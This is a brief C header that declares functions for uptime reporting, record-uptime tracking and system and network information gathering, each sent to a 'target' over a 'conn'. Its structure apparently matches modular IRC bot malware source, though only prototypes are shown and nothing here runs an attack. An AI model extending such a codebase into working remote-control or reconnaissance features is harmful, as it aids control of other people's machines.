
char *Uptime(DWORD TickCount,DWORD Startup, BOOL vDays=FALSE);

#ifndef NO_RECORD_UPTIME
extern BOOL bRecUpdated;
char *RecordUptime(void);
BOOL UpdateRecord(void);
DWORD GetRecord(void);
DWORD WINAPI RecordUptimeThread(LPVOID param);
#endif

#ifndef NO_SYSINFO
void sysinfo(char *target, void* conn);
#endif
#ifndef NO_NETINFO
void netinfo(char *target, void* conn);
#endif
